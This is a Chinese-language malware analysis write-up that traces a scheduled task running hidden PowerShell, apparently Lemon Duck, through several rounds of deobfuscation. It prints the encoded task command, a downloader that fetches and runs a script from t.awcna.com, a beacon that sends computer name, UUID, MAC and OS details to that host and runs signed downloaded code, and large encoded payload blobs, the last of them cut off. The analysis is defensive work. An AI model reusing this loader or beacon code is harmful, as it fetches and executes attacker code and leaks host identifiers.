# 起因
* 杀软反复弹窗，报cmd调用powshell，大概每隔一个小时

# 分析
## 排查思路
* 用进程管理工具查看拦截cmd的父进程
* 发现是定时任务导致的cmd调用powshell(所以才每個小時彈出一次)

## 提取计划任务3个
* 这三个计划任务里面的混淆代码都不同，只分析其中一个（其它應該大同小异，沒有分析）(解密因为很简单，就不細說，還是不懂的小夥伴可以问我)
![avatar](./pic/taskEng.png)

* 提取計劃任務的主要執行代碼部分
```
<Exec>
  <Command>cmd</Command>
  <Arguments>/c "set A=power&amp; call %A%shell -ep bypass -e JABMAGUAbQBvAG4AXwBEAHUAYwBrAD0AJwBUAEsAUwBoAE0AXABJAG4AVQBzAHIAUABjAHYAJwA7ACQAeQA9ACcAaAB0AHQAcAA6AC8ALwB0AC4AYQB3AGMAbgBhAC4AYwBvAG0ALwB2AC4AagBzACcAOwAkAHoAPQAkAHkAKwAnAHAAJwArACcAPwBlAGIAXwAyADAAMQA5ADAANwAxADgAJwA7ACQAbQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHkAKQA7AFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAE0ARAA1AF0AOgA6AEMAcgBlAGEAdABlACgAKQAuAEMAbwBtAHAAdQB0AGUASABhAHMAaAAoACQAbQApAHwAZgBvAHIAZQBhAGMAaAB7ACQAcwArAD0AJABfAC4AVABvAFMAdAByAGkAbgBnACgAJwB4ADIAJwApAH0AOwBpAGYAKAAkAHMALQBlAHEAJwBkADgAMQAwADkAYwBlAGMAMABhADUAMQA3ADEAOQBiAGUANgBmADQAMQAxAGYANgA3AGIAMwBiADcAZQBjADEAJwApAHsASQBFAFgAKAAtAGoAbwBpAG4AWwBjAGgAYQByAFsAXQBdACQAbQApAH0A"</Arguments>
</Exec>
```

* 第零次，简单解密Arguments
```
powershell -ep bypass -e JABMAGUAbQBvAG4AXwBEAHUAYwBrAD0AJwBUAEsAUwBoAE0AXABJAG4AVQBzAHIAUABjAHYAJwA7ACQAeQA9ACcAaAB0AHQAcAA6AC8ALwB0AC4AYQB3AGMAbgBhAC4AYwBvAG0ALwB2AC4AagBzACcAOwAkAHoAPQAkAHkAKwAnAHAAJwArACcAPwBlAGIAXwAyADAAMQA5ADAANwAxADgAJwA7ACQAbQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHkAKQA7AFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAE0ARAA1AF0AOgA6AEMAcgBlAGEAdABlACgAKQAuAEMAbwBtAHAAdQB0AGUASABhAHMAaAAoACQAbQApAHwAZgBvAHIAZQBhAGMAaAB7ACQAcwArAD0AJABfAC4AVABvAFMAdAByAGkAbgBnACgAJwB4ADIAJwApAH0AOwBpAGYAKAAkAHMALQBlAHEAJwBkADgAMQAwADkAYwBlAGMAMABhADUAMQA3ADEAOQBiAGUANgBmADQAMQAxAGYANgA3AGIAMwBiADcAZQBjADEAJwApAHsASQBFAFgAKAAtAGoAbwBpAG4AWwBjAGgAYQByAFsAXQBdACQAbQApAH0A
```

* 第一次解密得到powshell下载脚本(base64解碼即可)

```
$ L e m o n _ D u c k = ' T K S h M \ I n U s r P c v ' ; $ y = ' h t t p : / / t . a w c n a . c o m / v . j s ' ; $ z = $ y + ' p ' + ' ? e b _ 2 0 1 9 0 7 1 8 ' ; $ m = ( N e w - O b j e c t   S y s t e m . N e t . W e b C l i e n t ) . D o w n l o a d D a t a ( $ y ) ; [ S y s t e m . S e c u r i t y . C r y p t o g r a p h y . M D 5 ] : : C r e a t e ( ) . C o m p u t e H a s h ( $ m ) | f o r e a c h { $ s + = $ _ . T o S t r i n g ( ' x 2 ' ) } ; i f ( $ s - e q ' d 8 1 0 9 c e c 0 a 5 1 7 1 9 b e 6 f 4 1 1 f 6 7 b 3 b 7 e c 1 ' ) { I E X ( - j o i n [ c h a r [ ] ] $ m ) }

$Lemon_Duck='TKShM\InUsrPcv';
$y='http://t.awcna.com/v.js';
$z=$y+'p'+'?eb_20190718';
$m=(New-ObjectSystem.Net.WebClient).DownloadData($y);
[System.Security.Cryptography.MD5]::Create().ComputeHash($m)|foreach{$s+=$_.ToString('x2')};
if($s-eq'd8109cec0a51719be6f411f67b3b7ec1'){IEX(-join[char[ ]]$m)}
```

* v.js脚本内容,动态执行解密解压缩后的代码
```
Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('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')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
```

* 第二次解密
```
Sv  5tI (")'x'+]31[DILlEHs$+]1[dillEHs$ (.| )29]rAhc[,)38]rAhc[+94]rAhc[+58]rAhc[(  EcALPErc-421]rAhc[,'h23' EcalPER- 63]rAhc[,)08]rAhc[+111]rAhc[+68]rAhc[(  EcalPER-93]rAhc[,)07]rAhc[+801]rAhc[+96]rAhc[(  EcALPErc-  )'
)FlEXFlE+]31[dIlLehsPoV+]1[DillehSPoV ( . h23)93]RahC[]gniRT'+'s[,)15]RahC[+2'+'21]RahC[+57]RahC[((ecAlPEr.)421]RahC[]gniRTs'+'[,)301]RahC[+511]Ra'+'hC[+27]RahC[((ecAlPEr.)FlES1UFlE,FlEca2FlE(ecAlPEr.)43]RahC[]gniRTs[,FlE8PbFlE(ecAlPEr.)FlEPoVFlE,FlEM9FFlE(ecAlPEr.)F
lE}
}
)setyb_warM9F]]['+'rahFlE+FlEc[nioFlE+'+'FlEj-( XEIFlE+FlE		
{ ))yarrAeFlE+FlEtybFlE+FlEM9F,1'+'ahsM9F,setyb_warM9F(ataDFlE+FlEyfirev.asrM9F(fi
rFlE+FlEedivorPecivreSo'+'tpyrC1AHS.yhpargotpyrC.ytiruceS.'+'metsyS tcejbO-weN = 1ahsM9F
'+')46esabM9F(gnirtS46esaBmorF::]trevnoc[ = yarrAetybM9F
'+')setyb_ngFlE+FlE'+'isM9F]][rahc[(nioj- = 46esabM9F
FlE+FlE)smaraPasrM9F(sretemFlE+FlEaraPtropmI'+'.asrM9F
;redivorPecivreSotpyrCASR.yhpargotpyrC.ytiruceS.metsyS emaNepyT- tcejbO-weN = asrM9F
10x0,00x0,10x0 = tnenopFlE+FlExE.smaraPasrM9F
d5x0,b6x0,74x0,7bx0,8FlE+FlE3x0,aex0,79x0,eax0,b7x0,4ax0,36x0,88x0,7fx0,5dx0,36x0,dfx0,27x0,01x0,59x0,e2xFlE+FlE0,6FlE+FlEfx0,f3x0,79x0,bdx0,89x0,a0x0'+',bcx0,03x0,e6x0,93x0FlE+F'+'lE,fcx0,0dx0,24x0,e8x0,59xFlE+FlE0,eax0,a6x0,19x0,7ax0,04x0,97x0,dcx0,21x0,2ex0,f9x0,7
ax'+'0,a8x0,87x0,43x0,7cx0,7ex0'+',dcx0,10x0,25xFlE+FlE0,6cx0,37x0,03x0,91x0,1dxF'+'lE+FlE0,b2x0,d7x0,b9x0,e2FlE+FlEx0,8bx0,cFlE+Fl'+'E6x0,eex0'+',29x0,2'+'fx0'+',53x0,fbx0,88x0,'+'cdx0FlE+FlE,06x0FlE+FlE,1dx0,11x0,6fx0,f4x'+'0,6ax0,dFlE+FlEbx0,edx0Fl'+'E+FlE,'+'acx0
,e6x0,69x0,70x0'+',68x0,FlE+FlE07x0,26x0,b3x0,f4x0,3fxFl'+'E+FlE0,b6x'+'0,73x0,dFlE+FlEcx0,FlE+FlEdcFlE+FlEx0,0Fl'+'E+FlEcx0,d3x0,25x0,c3x0,32x0,e4x0,eax0,6dx0,76x0,bex0,5FlE+FlE5x0,b7x0,c6x0,FlE+FlEeFlE+FlE6FlE+FlEx0,37x0,a9x0,35x0,37x0,ffx0,f2x0,ffx0,28x0,d9x0,99x0
,e5x0'+',14x0FlE+FlE,d6x0,cbx0,79x0,bbx0,7dx0,8ax0,56x0,aFlE+FlEd'+'x0 = suludFlE+FlEoM.smaraPasr'+'M9F
FlE+FlEsretemaraPASR.yhpargotpyrC.ytiruceS.metsyS tcejbO-weN = s'+'maraPasrM9F
;]tnuocFlE+FlE.setyb_serM9F..371[setyb_serM9F = setyb_warM9FlE'+'+FlEF
;]171..0[setyb_serM9F = setyb_ngisM9F	FlE+FlE
{)371 tg- tnuoc.setyb_serM9F(fi
)lrulanifM9F(ataDdaolnwo'+'D.tneilcbewM9F = setyb_serM9F
))3zK-3zK,3zKca23zK(ecalper.kcuD_nomeLM9FlE+FlEFFlE+FlE+8Pb'+'-kcuD-nomeL8Pb,8'+'PbtnegA-resU8Pb(dda.sredaeH.tneilcbewM9F
tneilCbeW.FlE+Fl'+'EteN.me'+'tsyS tcejbOFlE+FlE-weN = tneilcbewM9F'+'
pmatsemitM9F+8Pb=T_&8Pb+tibM9F+8Pb=TIFlE+FlEB&8Pb+soM9F+8Pb=SO&8Pb+camM9FlE+FlEF+8Pb=CAM&8Pb+diugM9F+8Pb=DIUG&8Pb+eman_pmocM9F+8Pb=DI?8Pb+lruM9F = lrulanifM9FlE+F'+'lEF
8Pbs%8Pb tamroFU- etaD-teG = pmatsemitM9F
]0[)8Pb-8Pb tilps- erutcetihcrASO.)metsy'+'Sgnita'+'rep'+'O_23niW tcejbOimW-t'+'eG(( = tibM9F
noisreV.)metsySgnitarepO_23niW ssalcFlE+FlE- tceFlE+FlEjbOimW-teG(FlE+FlE = soM9F
1'+' tsrif- tcejbo-tceFlE+FlEles '+'gsH sserddacaM.)FlE+FlE}eurtM9F QE- delbanepi._M9F{ er'+'ehw gsH noitarugifn'+'oCretpadAkFlE+FlEroFlE+FlEwteN'+'_23niW tcejbOimW-teFlE+Fl'+'EGFlE+FlE( = cam'+'M9F
DIUU.)tcudorPmFlE+FlEetsySrFlE+FlEetupmoC_23nFlE+FlEiW tcejboimw-teg( = diugMFlE+FlE9F
'+'EMANRETUPMOCFlE+FlE:vneM9F = eman_p'+'mocM9F
zM9F = lFlE+FlEruM9FFlE('(( ") ; . ( $SHeLlID[1]+$shelLid[13]+'x') ( [StrInG]::jOiN('',(  cHiLDiTEm  VARiABlE:5Ti).VaLUe[ -1 ..-((  cHiLDiTEm  VARiABlE:5Ti).VaLUe.LENgTh)]))
```

`
放到powshell裏面執行$Shelid[1] 返回i 其它同理
$SHeLlID[1]  = i
$SHeLlID[13] = e
`

`
iex = Invoke-Expression
`

* 第三次解密
```
('F9Mur'+'l = F9Mz
F9Mcomp_name = F9Menv:'+'COMPUTERNAME
F9'+'Mguid = (get-wmiobject Wi'+'n32_Compute'+'rSyste'+'mProduct).UUID
F9Mmac = ('+'G'+'et-WmiObject Win32_Netw'+'or'+'kAdapterConfiguration Hsg where {F9M_.ipenabled -EQ F9Mtrue}'+').Macaddress Hsg sel'+'ect-object -first 1
F9Mos = '+'(Get-WmiObj'+'ect -'+'class Win32_OperatingSystem).Version
F9Mbit = ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -split bP8-bP8)[0]
F9Mtimestamp = Get-Date -UFormat bP8%sbP8
F'+'9Mfinalurl = F9Murl+bP8?ID=bP8+F9Mcomp_name+bP8&GUID=bP8+F9Mguid+bP8&MAC=bP8+F'+'9Mmac+bP8&OS=bP8+F9Mos+bP8&B'+'IT=bP8+F9Mbit+bP8&_T=bP8+F9Mtimestamp
F9Mwebclient = New-'+'Object System.Net'+'.WebClient
F9Mwebclient.Headers.add(bP8User-AgentbP8,bP8Lemon-Duck-bP8+'+'F'+'9MLemon_Duck.replace(Kz32acKz3,Kz3-Kz3))
F9Mres_bytes = F9Mwebclient.DownloadData(F9Mfinalurl)
if(F9Mres_bytes.count -gt 173){
'+'	F9Msign_bytes = F9Mres_bytes[0..171];
	F'+'9Mraw_bytes = F9Mres_bytes[173..F9Mres_bytes.'+'count];
	F9MrsaParams = New-Object System.Security.Cryptography.RSAParameters'+'
	F9MrsaParams.Mo'+'dulus = 0xd'+'a,0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,'+'0x41,0x5e,
0x99,0x9d,0x82,0xff,0x2f,0xff,0x73,0x53,0x9a,0x73,0x'+'6'+'e'+',0x6c,0x7b,0x5'+'5,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc'+'0,0x'+'cd'+',0xc'+'d,0x37,0x6b,0'+'xf3,0x4f,0x3b,0x62,0x70'+',0x86,0x07,0x96,0x6e,
0xca,'+'0xde,0xb'+'d,0xa6,0x4f,0xf6,0x11,0xd1,'+'0x60,'+'0xdc,0x88,0xbf,0x35,0xf2,0x92,0xee,0x6'+'c,0xb8,0x'+'2e,0x9b,0x7d,0x2b,0'+'xd1,0x19,0x30,0x73,0xc6,0'+'x52,0x01,0xcd,0xe7,0xc7,0x34,0x78,0x8a,0xa
7,0x9f,0xe2,0x12,0xcd,0x79,0x40,0xa7,0x91,0x6a,0xae,0'+'x95,0x8e,0x42,0xd0,0xcf,'+'0x39,0x6e,0x30,0xcb,0x0a,0x98,0xdb,0x97,0x3f,0xf'+'6,0'+'x2e,0x95,0x10,0x72,0xfd,0x63,0xd5,0xf7,0x88,0x63,0xa4,0x7b,0xae,0x97,0xea,0x3'+'8,0xb7,0x47,0x6b,0x5d
	F9MrsaParams.Ex'+'ponent = 0x01,0x00,0x01
	F9Mrsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider;
	F9Mrsa.ImportPara'+'meters(F9MrsaParams)'+'
	F9Mbase64 = -join([char[]]F9Msi'+'gn_bytes)
	F9MbyteArray = [convert]::FromBase64String(F9Mbase64)
	F9Msha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvide'+'r
	if(F9Mrsa.verify'+'Data(F9Mraw_bytes,F9Msha1,F9M'+'byt'+'eArray)) {
		'+'IEX (-j'+'oin[c'+'har[]]F9Mraw_bytes)
	}
}El
F').rEPlAce('F9M','$').rEPlAce('bP8',[sTRing][ChaR]34).rEPlAce('2ac','\').rEPlAce(([ChaR]72+[ChaR]115+[ChaR]103),[sTRing][ChaR]124).rEPlAce(([ChaR]75+[ChaR]122+[ChaR]51),[sTRing][ChaR]39)| . ( $ShelliD[1]+$sheLlId[13]+'X')
```

`
注意在ELF後面添加單引號，不知道什麽原因沒有閉合，我們手動閉合
`

* 第四次解密

```
$y='http://t.awcna.com/v.js';
$z=$y+'p'+'?eb_20190718';
$url = $z
結合上面的解密代碼構造url
$comp_name = $env:COMPUTERNAME
$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID
$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1
$os = (Get-WmiObject -class Win32_OperatingSystem).Version
$bit = ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -split "-")[0]
$timestamp = Get-Date -UFormat "%s"
$finalurl = $url+"?ID="+$comp_name+"&GUID="+$guid+"&MAC="+$mac+"&OS="+$os+"&BIT="+$bit+"&_T="+$timestamp

Write-Output $finalurl
$webclient = New-Object System.Net.WebClient
$webclient.Headers.add("User-Agent","Lemon-Duck-"+$Lemon_Duck.replace('\','-'))
$res_bytes = $webclient.DownloadData($finalurl)

if($res_bytes.count -gt 173){
	$sign_bytes = $res_bytes[0..171];
	$raw_bytes = $res_bytes[173..$res_bytes.count];
	$rsaParams = New-Object System.Security.Cryptography.RSAParameters
	$rsaParams.Modulus = 0xda,0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,0x41,0x5e,
0x99,0x9d,0x82,0xff,0x2f,0xff,0x73,0x53,0x9a,0x73,0x6e,0x6c,0x7b,0x55,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc0,0xcd,0xcd,0x37,0x6b,0xf3,0x4f,0x3b,0x62,0x70,0x86,0x07,0x96,0x6e,
0xca,0xde,0xbd,0xa6,0x4f,0xf6,0x11,0xd1,0x60,0xdc,0x88,0xbf,0x35,0xf2,0x92,0xee,0x6c,0xb8,0x2e,0x9b,0x7d,0x2b,0xd1,0x19,0x30,0x73,0xc6,0x52,0x01,0xcd,0xe7,0xc7,0x34,0x78,0x8a,0xa
7,0x9f,0xe2,0x12,0xcd,0x79,0x40,0xa7,0x91,0x6a,0xae,0x95,0x8e,0x42,0xd0,0xcf,0x39,0x6e,0x30,0xcb,0x0a,0x98,0xdb,0x97,0x3f,0xf6,0x2e,0x95,0x10,0x72,0xfd,0x63,0xd5,0xf7,0x88,0x63,0xa4,0x7b,0xae,0x97,0xea,0x38,0xb7,0x47,0x6b,0x5d
	$rsaParams.Exponent = 0x01,0x00,0x01
	$rsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider;
	$rsa.ImportParameters($rsaParams)
	$base64 = -join([char[]]$sign_bytes)
	$byteArray = [convert]::FromBase64String($base64)
	$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
	if($rsa.verifyData($raw_bytes,$sha1,$byteArray)) {
		IEX (-join[char[]]$raw_bytes)
	}
```

* 下載v.jsp
```
ez41FdG4MLzs2oDBWlecdU68n8v+cJTq+cCeg27MiI1InxKwasrWJqTtlOLCgvxCaXek0i4YMDWo71J/eJO65szDTh9/LX+W8AhqUIl5ANBquNWonx4cI68MposPpAaGx3vNotMXaQp3e2BPPFeclqOLXo/wCt1ycDwrI3dbfio=
Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('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